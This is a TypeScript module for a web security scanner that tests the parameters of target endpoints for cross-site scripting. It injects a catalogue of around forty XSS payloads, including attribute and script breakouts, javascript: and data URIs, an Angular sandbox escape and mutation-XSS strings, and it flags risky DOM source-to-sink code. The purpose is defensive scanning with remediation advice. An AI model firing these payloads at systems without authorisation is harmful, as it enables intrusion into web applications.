/**
 * Enhanced XSS Detection Module
 * Covers ALL 6 XSS types from Google's XSS Game + Modern Bypasses
 *
 * Detection Coverage:
 * - Level 1: Reflected XSS (URL parameters)
 * - Level 2: Stored XSS (POST data persistence)
 * - Level 3: DOM-based XSS (URL fragment)
 * - Level 4: JavaScript context breakout
 * - Level 5: javascript: protocol in href
 * - Level 6: External script loading
 * - Plus: Template injection, mXSS, encoding bypasses
 */

import type { ScanModuleInterface, EndpointInfo, ModuleFinding } from '../scanner/orchestrator';
import type { HttpClient } from '../scanner/http-client';
import { expandEndpoint } from './_params';

const CANARY = 'hm7x9k3p';
const CANARY_MATH = '91*97';  // Result: 8827

interface XssPayload {
  payload: string;
  context: string;
  type: 'reflected' | 'stored' | 'dom' | 'csti' | 'protocol' | 'bypass' | 'mxss';
  severity: 'critical' | 'high' | 'medium' | 'low';
  description: string;
}

// Comprehensive payload set covering all XSS types
const PAYLOADS: XssPayload[] = [
  // ═══════════════════════════════════════════════════════════════
  // LEVEL 1: HTML BODY - REFLECTED XSS
  // ═══════════════════════════════════════════════════════════════
  {
    payload: `<script>alert('${CANARY}')</script>`,
    context: 'HTML body script injection',
    type: 'reflected',
    severity: 'high',
    description: 'Basic script tag injection in HTML body'
  },
  {
    payload: `<script>alert\`${CANARY}\`</script>`,
    context: 'Template literal script injection',
    type: 'reflected',
    severity: 'high',
    description: 'Script tag with template literal syntax'
  },

  // ═══════════════════════════════════════════════════════════════
  // LEVEL 2: EVENT HANDLERS (for Stored XSS / filter bypass)
  // ═══════════════════════════════════════════════════════════════
  {
    payload: `<img src=x onerror=alert('${CANARY}')>`,
    context: 'IMG onerror event handler',
    type: 'reflected',
    severity: 'high',
    description: 'Event handler bypasses script tag filters'
  },
  {
    payload: `<svg onload=alert('${CANARY}')>`,
    context: 'SVG onload event handler',
    type: 'reflected',
    severity: 'high',
    description: 'SVG element with onload event'
  },
  {
    payload: `<svg/onload=alert('${CANARY}')>`,
    context: 'SVG onload (no space)',
    type: 'bypass',
    severity: 'high',
    description: 'SVG without space after tag name'
  },
  {
    payload: `<details open ontoggle=alert('${CANARY}')>`,
    context: 'Details ontoggle event',
    type: 'reflected',
    severity: 'high',
    description: 'HTML5 details element auto-triggers'
  },
  {
    payload: `<input onfocus=alert('${CANARY}') autofocus>`,
    context: 'Input autofocus event',
    type: 'reflected',
    severity: 'high',
    description: 'Auto-focuses and triggers onfocus'
  },
  {
    payload: `<body onload=alert('${CANARY}')>`,
    context: 'Body onload event',
    type: 'reflected',
    severity: 'high',
    description: 'Body tag with onload'
  },
  {
    payload: `<marquee onstart=alert('${CANARY}')>`,
    context: 'Marquee onstart event',
    type: 'reflected',
    severity: 'medium',
    description: 'Legacy marquee element'
  },
  {
    payload: `<video><source onerror=alert('${CANARY}')></video>`,
    context: 'Video source onerror',
    type: 'reflected',
    severity: 'high',
    description: 'Video element error handling'
  },

  // ═══════════════════════════════════════════════════════════════
  // ATTRIBUTE BREAKOUT (double and single quotes)
  // ═══════════════════════════════════════════════════════════════
  {
    payload: `"><img src=x onerror=alert('${CANARY}')>`,
    context: 'Attribute breakout (double quote)',
    type: 'reflected',
    severity: 'high',
    description: 'Break out of double-quoted attribute'
  },
  {
    payload: `'><img src=x onerror=alert('${CANARY}')>`,
    context: 'Attribute breakout (single quote)',
    type: 'reflected',
    severity: 'high',
    description: 'Break out of single-quoted attribute'
  },
  {
    payload: `"><svg/onload=alert('${CANARY}')>`,
    context: 'Attribute breakout to SVG',
    type: 'reflected',
    severity: 'high',
    description: 'Double quote breakout to SVG'
  },
  {
    payload: `" onfocus=alert('${CANARY}') autofocus="`,
    context: 'Attribute injection (in-place)',
    type: 'reflected',
    severity: 'high',
    description: 'Inject event handler without breaking tag'
  },

  // ═══════════════════════════════════════════════════════════════
  // LEVEL 3: DOM-BASED XSS (URL Fragment)
  // ═══════════════════════════════════════════════════════════════
  {
    payload: `1' onerror='alert("${CANARY}")' x='`,
    context: 'DOM XSS fragment attribute injection',
    type: 'dom',
    severity: 'high',
    description: 'Fragment value used in innerHTML/src attribute'
  },
  {
    payload: `"><script>alert('${CANARY}')</script>`,
    context: 'DOM XSS fragment HTML injection',
    type: 'dom',
    severity: 'high',
    description: 'Fragment value used in innerHTML'
  },

  // ═══════════════════════════════════════════════════════════════
  // LEVEL 4: JAVASCRIPT CONTEXT BREAKOUT
  // ═══════════════════════════════════════════════════════════════
  {
    payload: `'-alert('${CANARY}')-'`,
    context: 'JavaScript string breakout (single)',
    type: 'reflected',
    severity: 'high',
    description: 'Break out of JS single-quoted string'
  },
  {
    payload: `"-alert('${CANARY}')-"`,
    context: 'JavaScript string breakout (double)',
    type: 'reflected',
    severity: 'high',
    description: 'Break out of JS double-quoted string'
  },
  {
    payload: `');alert('${CANARY}');//`,
    context: 'JavaScript function breakout',
    type: 'reflected',
    severity: 'high',
    description: 'Close function call and inject alert'
  },
  {
    payload: `";alert('${CANARY}');//`,
    context: 'JavaScript statement breakout',
    type: 'reflected',
    severity: 'high',
    description: 'End statement and inject alert'
  },
  {
    payload: `</script><script>alert('${CANARY}')</script>`,
    context: 'Script tag breakout',
    type: 'reflected',
    severity: 'high',
    description: 'Close script tag and inject new one'
  },
  {
    payload: `\`-alert('${CANARY}')-\``,
    context: 'Template literal breakout',
    type: 'reflected',
    severity: 'high',
    description: 'Break out of JS template literal'
  },

  // ═══════════════════════════════════════════════════════════════
  // LEVEL 5: JAVASCRIPT: PROTOCOL
  // ═══════════════════════════════════════════════════════════════
  {
    payload: `javascript:alert('${CANARY}')`,
    context: 'JavaScript protocol in href',
    type: 'protocol',
    severity: 'medium',
    description: 'javascript: URI in link href'
  },
  {
    payload: `javascript:alert\`${CANARY}\``,
    context: 'JavaScript protocol (template literal)',
    type: 'protocol',
    severity: 'medium',
    description: 'javascript: with template literal'
  },
  {
    payload: `java\nscript:alert('${CANARY}')`,
    context: 'JavaScript protocol (newline bypass)',
    type: 'bypass',
    severity: 'medium',
    description: 'Newline in javascript: bypasses some filters'
  },
  {
    payload: `javascript\t:alert('${CANARY}')`,
    context: 'JavaScript protocol (tab bypass)',
    type: 'bypass',
    severity: 'medium',
    description: 'Tab character bypass'
  },

  // ═══════════════════════════════════════════════════════════════
  // LEVEL 6: EXTERNAL SCRIPT / DATA URI
  // ═══════════════════════════════════════════════════════════════
  {
    payload: `data:text/html,<script>alert('${CANARY}')</script>`,
    context: 'Data URI HTML injection',
    type: 'reflected',
    severity: 'high',
    description: 'Data URI with script'
  },
  {
    payload: `data:text/javascript,alert('${CANARY}')`,
    context: 'Data URI JavaScript',
    type: 'reflected',
    severity: 'high',
    description: 'Direct JavaScript in data URI'
  },

  // ═══════════════════════════════════════════════════════════════
  // TEMPLATE INJECTION (Client-Side)
  // ═══════════════════════════════════════════════════════════════
  {
    payload: `{{${CANARY_MATH}}}`,
    context: 'Angular/Vue template injection',
    type: 'csti',
    severity: 'critical',
    description: 'Client-side template injection'
  },
  {
    payload: `{{constructor.constructor('alert(1)')()}}`,
    context: 'Angular sandbox escape',
    type: 'csti',
    severity: 'critical',
    description: 'Angular template to XSS'
  },
  {
    payload: `\${${CANARY_MATH}}`,
    context: 'ES6 template literal injection',
    type: 'csti',
    severity: 'high',
    description: 'JavaScript template literal'
  },
  {
    payload: `#{${CANARY_MATH}}`,
    context: 'Ruby/Pug template injection',
    type: 'csti',
    severity: 'high',
    description: 'Alternative template syntax'
  },

  // ═══════════════════════════════════════════════════════════════
  // ENCODING BYPASSES
  // ═══════════════════════════════════════════════════════════════
  {
    payload: `<img src=x onerror=alert('${CANARY}')>`,
    context: 'Unicode normalization bypass',
    type: 'bypass',
    severity: 'high',
    description: 'Full-width characters'
  },
  {
    payload: `<svg><script>alert&#40;'${CANARY}'&#41;</script></svg>`,
    context: 'HTML entity encoding',
    type: 'bypass',
    severity: 'high',
    description: 'HTML entities for parentheses'
  },
  {
    payload: `<iMg sRc=x oNeRrOr=alert('${CANARY}')>`,
    context: 'Mixed case bypass',
    type: 'bypass',
    severity: 'high',
    description: 'Case variation to bypass filters'
  },

  // ═══════════════════════════════════════════════════════════════
  // MUTATION XSS (mXSS)
  // ═══════════════════════════════════════════════════════════════
  {
    payload: `<noscript><p title="</noscript><script>alert('${CANARY}')</script>">`,
    context: 'mXSS via noscript',
    type: 'mxss',
    severity: 'critical',
    description: 'Browser parsing differential'
  },
  {
    payload: `<svg><![CDATA[><script>alert('${CANARY}')</script>]]>`,
    context: 'mXSS via SVG CDATA',
    type: 'mxss',
    severity: 'critical',
    description: 'SVG CDATA mutation'
  },
];

// DOM XSS sinks to detect in JavaScript files
const DOM_SINKS = [
  'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
  'eval', 'setTimeout', 'setInterval', 'Function', 'execScript',
  'location', 'location.href', 'location.hash', 'location.search', 'location.replace', 'location.assign',
  'window.open', 'document.cookie',
  '.html(', 'jQuery.html', '$.html', // jQuery
  'dangerouslySetInnerHTML', // React
  'v-html', // Vue
  'ng-bind-html', '[innerHTML]', // Angular
  'insertAdjacentHTML',
];

// DOM XSS sources
const DOM_SOURCES = [
  'location.hash', 'location.search', 'location.href',
  'document.URL', 'document.documentURI', 'document.referrer', 'document.baseURI',
  'window.name',
  'postMessage', 'addEventListener.*message',
  'localStorage.getItem', 'sessionStorage.getItem',
  'document.cookie',
  'URLSearchParams',
];

export class XssEnhancedModule implements ScanModuleInterface {
  id = 'xss-enhanced';
  name = 'Cross-Site Scripting (Enhanced)';

  async scan(url: string, endpoints: EndpointInfo[], client: HttpClient): Promise<ModuleFinding[]> {
    const findings: ModuleFinding[] = [];
    const tested = new Set<string>();

    for (const rawEp of endpoints) {
      for (const ep of expandEndpoint(rawEp)) {
        if (ep.params.length === 0) continue;

        for (const param of ep.params) {
          const key = `${ep.url}:${param}`;
          if (tested.has(key)) continue;
          tested.add(key);

          // Step 1: Check reflection with unique canary
          const canaryRes = await this.injectPayload(ep, param, CANARY, client);
          if (canaryRes.status === 0 || !canaryRes.body.includes(CANARY)) continue;

          // Determine reflection context
          const ctx = this.detectContext(canaryRes.body, CANARY);

          // Step 2: Test context-appropriate payloads
          const payloadsToTest = this.getPayloadsForContext(ctx);

          for (const { payload, context, type, severity, description } of payloadsToTest) {
            const res = await this.injectPayload(ep, param, payload, client);
            if (res.status === 0) continue;

            // Exact match — payload rendered unencoded
            if (res.body.includes(payload)) {
              findings.push({
                severity,
                title: `${type.toUpperCase()} XSS: ${context}`,
                description: `Parameter "${param}" at ${ep.url} reflects user input directly into the HTML response. ${description}. Payload appears verbatim in response.`,
                url: ep.url,
                parameter: param,
                remediation: this.getRemediation(type),
                cwe_id: 'CWE-79',
                owasp_category: 'A03:2021',
                cvss_score: this.getCvssScore(severity),
                evidence: {
                  payload,
                  context,
                  xss_type: type,
                  reflection_context: ctx,
                  method: ep.method,
                  response_snippet: this.extractSnippet(res.body, payload),
                },
              });
              break;
            }

            // Check for template injection (91*97 → 8827)
            if (payload.includes(CANARY_MATH)) {
              const baselineRes = await this.injectPayload(ep, param, 'harmless_test', client);
              if (!baselineRes.body.includes('8827') && res.body.includes('8827')) {
                findings.push({
                  severity: 'critical',
                  title: 'Client-Side Template Injection',
                  description: `Parameter "${param}" is interpreted by a template engine. Expression ${payload} evaluated to 8827, confirming injection.`,
                  url: ep.url,
                  parameter: param,
                  remediation: 'Sanitize user input before template rendering. Use template engines that sandbox expressions.',
                  cwe_id: 'CWE-79',
                  owasp_category: 'A03:2021',
                  cvss_score: 9.8,
                  evidence: { payload, result: '8827', xss_type: 'csti' },
                });
                break;
              }
            }
          }
        }
      }
    }

    // Check for DOM XSS patterns in JavaScript files
    const jsEndpoints = endpoints.filter(ep =>
      ep.contentType?.includes('javascript') ||
      ep.url.endsWith('.js')
    );

    for (const jsEp of jsEndpoints.slice(0, 30)) {
      const res = await client.get(jsEp.url);
      if (res.status !== 200) continue;

      const domXssFindings = this.detectDomXss(jsEp.url, res.body);
      findings.push(...domXssFindings);
    }

    return findings;
  }

  private detectContext(body: string, canary: string): string {
    const idx = body.indexOf(canary);
    if (idx === -1) return 'unknown';

    const before = body.slice(Math.max(0, idx - 150), idx);
    const after = body.slice(idx, Math.min(body.length, idx + canary.length + 50));

    // Check various contexts
    if (/<script[^>]*>[^<]*$/i.test(before)) {
      if (/['"][^'"]*$/.test(before)) return 'js_string';
      if (/`[^`]*$/.test(before)) return 'js_template';
      return 'js_block';
    }
    if (/=\s*["'][^"']*$/i.test(before)) {
      if (/href\s*=\s*["'][^"']*$/i.test(before)) return 'href_attribute';
      if (/src\s*=\s*["'][^"']*$/i.test(before)) return 'src_attribute';
      if (/on\w+\s*=\s*["'][^"']*$/i.test(before)) return 'event_handler_attribute';
      return 'html_attribute';
    }
    if (/<!--[^>]*$/.test(before)) return 'html_comment';
    if (/<style[^>]*>[^<]*$/i.test(before)) return 'css_block';
    if (/<textarea[^>]*>[^<]*$/i.test(before)) return 'textarea';
    if (/<title[^>]*>[^<]*$/i.test(before)) return 'title';
    if (/<svg[^>]*>[^<]*$/i.test(before)) return 'svg_context';

    return 'html_body';
  }

  private getPayloadsForContext(ctx: string): XssPayload[] {
    switch (ctx) {
      case 'js_string':
        return PAYLOADS.filter(p =>
          p.context.includes('JavaScript') ||
          p.context.includes('string breakout') ||
          p.type === 'reflected'
        );
      case 'js_template':
        return PAYLOADS.filter(p =>
          p.context.includes('template') ||
          p.payload.includes('`')
        );
      case 'href_attribute':
        return PAYLOADS.filter(p =>
          p.type === 'protocol' ||
          p.context.includes('href') ||
          p.context.includes('Attribute breakout')
        );
      case 'html_attribute':
        return PAYLOADS.filter(p =>
          p.context.includes('Attribute') ||
          p.context.includes('breakout')
        );
      case 'event_handler_attribute':
        return PAYLOADS.filter(p =>
          p.context.includes('breakout') ||
          p.payload.startsWith("'") ||
          p.payload.startsWith('"')
        );
      default:
        return PAYLOADS;
    }
  }

  private detectDomXss(jsUrl: string, code: string): ModuleFinding[] {
    const findings: ModuleFinding[] = [];
    const lines = code.split('\n');

    // Find source-to-sink flows
    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];

      for (const sink of DOM_SINKS) {
        if (!line.includes(sink)) continue;

        for (const source of DOM_SOURCES) {
          const sourcePattern = source.replace('.', '\\.').replace('*', '.*');
          if (new RegExp(sourcePattern).test(line)) {
            findings.push({
              severity: 'high',
              title: 'Potential DOM-Based XSS',
              description: `JavaScript file contains a potential DOM XSS flow: ${source} → ${sink}. User-controlled input may flow into a dangerous sink without sanitization.`,
              url: jsUrl,
              parameter: 'DOM',
              remediation: 'Sanitize user input before passing to DOM manipulation methods. Use textContent instead of innerHTML. Implement Trusted Types.',
              cwe_id: 'CWE-79',
              owasp_category: 'A03:2021',
              cvss_score: 6.1,
              evidence: {
                source,
                sink,
                line_number: i + 1,
                code_snippet: line.trim().slice(0, 200),
                xss_type: 'dom',
              },
            });
          }
        }
      }
    }

    return findings;
  }

  private getRemediation(type: string): string {
    const remediations: Record<string, string> = {
      reflected: 'Apply context-aware output encoding. HTML-encode for body content, attribute-encode for attributes, JavaScript-encode for script contexts. Implement CSP with nonce-based script-src.',
      stored: 'Sanitize and validate all user input on storage. Apply output encoding on display. Implement CSP. Use frameworks with automatic escaping.',
      dom: 'Avoid innerHTML with user data. Use textContent or sanitization libraries (DOMPurify). Implement Trusted Types policy.',
      csti: 'Sanitize user input before template rendering. Use template engines that sandbox expressions. Avoid placing user input inside template delimiters.',
      protocol: 'Validate URL schemes. Only allow http/https protocols. Implement allowlist for redirect destinations.',
      bypass: 'Implement allowlist-based input validation. Use security libraries for encoding. Avoid regex-based blacklists.',
      mxss: 'Use DOMPurify or similar library for sanitization. Avoid innerHTML. Understand browser parsing quirks.',
    };
    return remediations[type] || remediations.reflected;
  }

  private getCvssScore(severity: string): number {
    const scores: Record<string, number> = {
      critical: 9.8,
      high: 7.5,
      medium: 5.3,
      low: 3.1,
    };
    return scores[severity] || 6.1;
  }

  private extractSnippet(body: string, payload: string): string {
    const idx = body.indexOf(payload);
    if (idx === -1) return '';
    const start = Math.max(0, idx - 50);
    const end = Math.min(body.length, idx + payload.length + 50);
    return body.slice(start, end).replace(/\s+/g, ' ').trim();
  }

  private async injectPayload(ep: EndpointInfo, param: string, payload: string, client: HttpClient) {
    if (ep.method === 'GET') {
      const u = new URL(ep.url);
      u.searchParams.set(param, payload);
      return client.send(u.href, { timeout: 10000 });
    }
    if (ep.contentType?.includes('json')) {
      const obj: Record<string, string> = {};
      for (const p of ep.params) obj[p] = p === param ? payload : 'test';
      return client.post(ep.url, JSON.stringify(obj), { 'Content-Type': 'application/json' });
    }
    const body = ep.params
      .map(p => `${encodeURIComponent(p)}=${encodeURIComponent(p === param ? payload : 'test')}`)
      .join('&');
    return client.post(ep.url, body, { 'Content-Type': 'application/x-www-form-urlencoded' });
  }
}
